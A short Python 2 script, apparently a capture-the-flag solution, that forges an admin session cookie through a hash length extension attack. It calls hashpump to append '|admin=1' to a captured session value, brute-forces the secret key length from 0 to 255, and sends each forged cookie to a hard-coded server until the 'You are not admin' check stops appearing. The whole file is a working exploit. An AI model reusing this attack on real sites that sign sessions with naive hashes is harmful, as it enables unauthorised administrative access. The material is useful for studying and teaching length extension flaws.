import sys
import ast
import requests
from subprocess import call
from subprocess import Popen, PIPE


def getPage(site, cookies, headers):
	r = requests.get(site, cookies=cookie, headers=headers)
	reply = r.text
	return reply

def hashpump(known_sig, known_orig, keylen):
	#hashpump -s sig -d orig -a append -k keylen
	argument = ["hashpump", "-s", known_sig, "-d", known_orig, "-a", "|admin=1", "-k", str(keylen)]
	print argument
	p = Popen(argument, stdin=PIPE, stdout=PIPE, stderr=PIPE)
	output, err = p.communicate(b"input data that is passed to subprocess' stdin")
	return output

# https://ctfcrew.org/writeup/54
'''
Parse the \x
'''
def horosho(s):
	i = s.find('\\x')
	res = s[0:i]
	while i != -1:
		n = int(s[i+2:i+4], 16)
		res += chr(n)
		s = s[i + 4:]
		i = s.find('\\x')
	res += s
	return res

session_orig = '757365723d6a6f686e7c706173733d373065306636636261393335313337356431656333343430633665326135653431333839643932633633326261613161323863613364393330633461356130357c61646d696e3d30'.decode("hex")
print session_orig
session_hash_orig = '7e2967c611fc7e66b2e75a2fcb4ef80cdc75c91c8967ef058203d99688a146ab'

for i in xrange (256):
	print 'doing', i
	pumped = hashpump(session_hash_orig, session_orig, i).split("\n")
	new_hash = pumped[0].strip()
	print new_hash
	print pumped[1]
	new_orig = horosho(pumped[1].strip())
	print new_orig

	site = 'http://128.199.98.78:32769/index.php'
	headers = {
	'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.89 Safari/537.36',
	}
	cookie = {
	'session': new_orig.encode("hex"),
	'session_hash' : new_hash
	}

	output = getPage(site, cookie, headers)
	print output
	if 'You are not admin' in output:
		pass
	else:
		break